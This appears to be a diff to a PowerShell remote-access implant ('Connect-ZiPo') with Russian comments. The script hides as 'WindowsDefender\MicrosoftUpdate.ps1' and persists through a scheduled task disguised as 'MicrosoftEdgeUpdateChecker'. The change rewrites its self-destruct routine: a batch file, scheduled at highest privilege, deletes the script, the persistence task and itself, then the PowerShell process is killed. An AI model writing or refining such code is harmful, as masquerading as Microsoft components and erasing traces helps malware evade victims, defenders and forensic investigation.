@@ -283,31 +283,32 @@ function Connect-ZiPo {
             $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
         }
 
+        $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
         $taskName = "MicrosoftEdgeUpdateChecker"
+        $cleanupTask = "ZiPo_Cleanup"
 
-        # Удалить задачу автозапуска
-        schtasks /Delete /TN $taskName /F | Out-Null
+        $batContent = @"
+@echo off
+timeout /t 5 >nul
+del "$scriptPath" /f /q
+schtasks /Delete /TN "$taskName" /F >nul 2>&1
+del "%~f0" /f /q
+schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
+"@
 
-        # Создать bat-файл для удаления скрипта и самого себя
-        $batPath = "$env:TEMP\cleanup.bat"
-        $bat = "@echo off`r`n" +
-               "timeout /t 3 > nul`r`n" +
-               "del `"$scriptPath`" /f /q`r`n" +
-               "del `"%~f0`" /f /q"
+        $batContent | Set-Content -Path $cleanupBat -Encoding ASCII
 
-        $bat | Set-Content -Path $batPath -Encoding ASCII
+        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
+            /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null
 
-        # Запустить .bat для удаления .ps1
-        Start-Process -FilePath $batPath -WindowStyle Hidden
-
-        # Завершить текущий PowerShell-процесс
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 1
         Stop-Process -Id $PID -Force
     }
     catch {
         return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
